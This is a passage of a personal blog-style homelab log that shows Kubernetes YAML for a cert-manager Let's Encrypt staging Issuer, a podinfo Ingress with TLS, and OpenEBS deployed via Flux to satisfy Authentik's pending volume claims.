font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> Issuer</span></span>
<span id="cb44-3"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">metadata</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb44-4"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">name</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> letsencrypt-staging</span></span>
<span id="cb44-5"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">spec</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb44-6"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">acme</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb44-7"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">    # The ACME server URL</span></span>
<span id="cb44-8"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">server</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> https://acme-staging-v02.api.letsencrypt.org/directory</span></span>
<span id="cb44-9"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">    # Email address used for ACME registration</span></span>
<span id="cb44-10"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">email</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> email@example.com</span></span>
<span id="cb44-11"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">    # Name of a secret used to store the ACME account private key</span></span>
<span id="cb44-12"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">privateKeySecretRef</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb44-13"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">      </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">name</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> letsencrypt-staging</span></span>
<span id="cb44-14"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">    # Enable the HTTP-01 challenge provider</span></span>
<span id="cb44-15"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">solvers</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb44-16"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">      </span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">-</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">http01</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb44-17"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">          </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">ingress</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb44-18"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">            </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">ingressClassName</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span></code></pre></div>
</div>
<p>This of course, has the downside that it will be used on all ingresses, but I should be able to get around this with the <code>http01-edit-in-place: "true"</code> annotation.</p>
<p>Finally, I <em>think</em> I have TLS working properly:</p>
<div class="code-with-filename">
<div class="code-with-filename-file">
<pre><strong>podinfo-ingress.yaml</strong></pre>
</div>
<div class="sourceCode" id="cb45" data-filename="podinfo-ingress.yaml" style="background: #f1f3f5;"><pre class="sourceCode yaml code-with-copy"><code class="sourceCode yaml"><span id="cb45-1"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">apiVersion</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> networking.k8s.io/v1</span></span>
<span id="cb45-2"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">kind</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> Ingress</span></span>
<span id="cb45-3"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">metadata</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb45-4"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">name</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> podinfo</span></span>
<span id="cb45-5"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">annotations</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb45-6"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">cert-manager.io/issuer</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"letsencrypt-staging"</span></span>
<span id="cb45-7"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">acme.cert-manager.io/http01-edit-in-place</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"true"</span></span>
<span id="cb45-8"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">namespace</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> default</span></span>
<span id="cb45-9"></span>
<span id="cb45-10"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">spec</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb45-11"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">tls</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb45-12"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">-</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">hosts</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span></span>
<span id="cb45-13"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">-</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"podinfo.moonpiedumpl.ing"</span></span>
<span id="cb45-14"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">secretName</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> podinfo-tls</span></span>
<span id="cb45-15"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">rules</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb45-16"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">-</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">host</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> podinfo.moonpiedumpl.ing</span></span>
<span id="cb45-17"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">http</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb45-18"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">      </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">paths</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb45-19"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">      </span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">-</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">path</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> /</span></span>
<span id="cb45-20"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">        </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">pathType</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> Exact</span></span>
<span id="cb45-21"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">        </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">backend</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb45-22"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">          </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">service</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb45-23"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">            </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">name</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> podinfo</span></span>
<span id="cb45-24"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">            </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">port</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb45-25"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">              </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">number</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">9898</span></span></code></pre></div>
</div>
<p>And this works! Except NOT!. It doesn’t errors, and I instead need to have my issuer be:</p>
<div class="sourceCode" id="cb46" style="background: #f1f3f5;"><pre class="sourceCode yaml code-with-copy"><code class="sourceCode yaml"><span id="cb46-1"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">apiVersion</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> cert-manager.io/v1</span></span>
<span id="cb46-2"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">kind</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> Issuer</span></span>
<span id="cb46-3"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">metadata</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb46-4"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">name</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> letsencrypt-staging</span></span>
<span id="cb46-5"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">namespace</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> default</span></span>
<span id="cb46-6"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">spec</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb46-7"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">acme</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb46-8"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">    # The ACME server URL</span></span>
<span id="cb46-9"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">server</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> https://acme-staging-v02.api.letsencrypt.org/directory</span></span>
<span id="cb46-10"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">    # Email address used for ACME registration</span></span>
<span id="cb46-11"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">email</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> moonpiedumplings2@gmail.com</span></span>
<span id="cb46-12"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">    # Name of a secret used to store the ACME account private key</span></span>
<span id="cb46-13"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">privateKeySecretRef</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb46-14"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">      </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">name</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> letsencrypt-staging</span></span>
<span id="cb46-15"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">    # Enable the HTTP-01 challenge provider</span></span>
<span id="cb46-16"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">solvers</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb46-17"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">      </span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">-</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">http01</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb46-18"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">          </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">ingress</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">{}</span></span></code></pre></div>
</section>
</section>
<section id="authentik" class="level2">
<h2 class="anchored" data-anchor-id="authentik">Authentik</h2>
<ul>
<li><a href="https://artifacthub.io/packages/helm/goauthentik/authentik" class="uri">https://artifacthub.io/packages/helm/goauthentik/authentik</a></li>
<li><a href="https://docs.goauthentik.io/docs/install-config/install/kubernetes">Authentik Docs</a></li>
</ul>
<section id="volumes" class="level3">
<h3 class="anchored" data-anchor-id="volumes">Volumes</h3>
<p>I attempted to deploy authentik without secrets. However, it crashes:</p>
<div class="sourceCode" id="cb47" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb47-1">Events:</span>
<span id="cb47-2">  Type     Reason            Age                From               Message</span>
<span id="cb47-3">  ----     ------            ----               ----               -------</span>
<span id="cb47-4">  Warning  FailedScheduling  46s (x4 over 15m)  default-scheduler  0/1 nodes are available: pod has unbound immediate PersistentVolumeClaims. preemption: 0/1 nodes are available: 1 Preemption is not helpful for scheduling.</span></code></pre></div>
<div class="sourceCode" id="cb48" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb48-1">[moonpie@lizard cert-manager]$ kubectl get -A persistentvolumeclaims</span>
<span id="cb48-2">NAMESPACE   NAME                                  STATUS    VOLUME   CAPACITY   ACCESS MODES   STORAGECLASS   VOLUMEATTRIBUTESCLASS   AGE</span>
<span id="cb48-3">default     data-authentik-postgresql-0           Pending                                                     &lt;unset&gt;                 39m</span>
<span id="cb48-4">default     redis-data-authentik-redis-master-0   Pending                                                     &lt;unset&gt;                 39m</span></code></pre></div>
<p>So, I need to create a persistent volume of some kind, and then have it specifically reference the persistent volume claims that are used.</p>
<p>But… which provider do I use. Ideally, I want something similar to docker/podman volumes, where I don’t have to deal with mapping them to exact host paths. I also want these persistent volume claims to be automatically met, that is, dynamically provisioned storage.</p>
<p>I decided to use [openebs] for this.</p>
<p>Here are my flux configs:</p>
<div class="sourceCode" id="cb49" style="background: #f1f3f5;"><pre class="sourceCode yaml code-with-copy"><code class="sourceCode yaml"><span id="cb49-1"><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">---</span></span>
<span id="cb49-2"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">apiVersion</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> source.toolkit.fluxcd.io/v1</span></span>
<span id="cb49-3"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">kind</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> HelmRepository</span></span>
<span id="cb49-4"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">metadata</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb49-5"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">name</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> openebs</span></span>
<span id="cb49-6"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">namespace</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> default</span></span>
<span id="cb49-7"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">spec</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb49-8"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">interval</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> 1m0s</span></span>
<span id="cb49-9"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">url</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> https://openebs.github.io/charts</span></span>
<span id="cb49-10"><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">---</span></span>
<span id="cb49-11"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">apiVersion</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> helm.toolkit.fluxcd.io/v2</span></span>
<span id="cb49-12"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">kind</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> HelmRelease</span></span>
<span id="cb49-13"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">metadata</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb49-14"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">name</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> openebs</span></span>
<span id="cb49-15"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">namespace</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> default</span></span>
<span id="cb49-16"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">spec</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb49-17"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">chart</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb49-18"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">spec</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb49-19"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">      </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">chart</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> openebs</span></span>
<span id="cb49-20"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">      </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">reconcileStrategy</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> ChartVersion</span></span>
<span id="cb49-21"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">      </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">sourceRef</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb49-22"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">        </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">kind</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> HelmRepository</span></span>
<span id="cb49-23"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">        </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">name</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> openebs</span></span>
<span id="cb49-24"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">      # version: </span></span>
<span id="cb49-25"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">interval</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> 1m0s</span></span></code></pre></div>
<p>I need to a set a version, but this deploys openebs for now. However, it doesn’t instantly work, because the openebs-hostpath provisioner is not set to the default for storage classes. But when I do, using <code>kubectl edit storageclass openebs-hostpath</code></p>
<div class="sourceCode" id="cb50" style="background: #f1f3f5;"><pre class="sourceCode yaml code-with-copy"><code class="sourceCode yaml"><span id="cb50-1"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">apiVersion</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> storage.k8s.io/v1</span></span>
<span id="cb50-2"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">kind</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> StorageClass</span></span>
<span id="cb50-3"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">metadata</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb50-4"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">annotations</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb50-5"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">    cas.openebs.io/config</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">: </span><span class="ch" style="color: #20794D;
background-color: null;
font-style: inherit;">|</span></span>
<span id="cb50-6">      - name: StorageType</span>
<span id="cb50-7">        value: "hostpath"</span>
<span id="cb50-8">      - name: BasePath</span>
<span id="cb50-9">        value: "/var/openebs/local"</span>
<span id="cb50-10"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">meta.helm.sh/release-name</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> openebs</span></span>
<span id="cb50-11"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">meta.helm.sh/release-namespace</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> default</span></span>
<span id="cb50-12"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">openebs.io/cas-type</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> local</span></span>
<span id="cb50-13"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">storageclass.kubernetes.io/is-default-class</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="st" style="color: #20794D;
background-color: null;
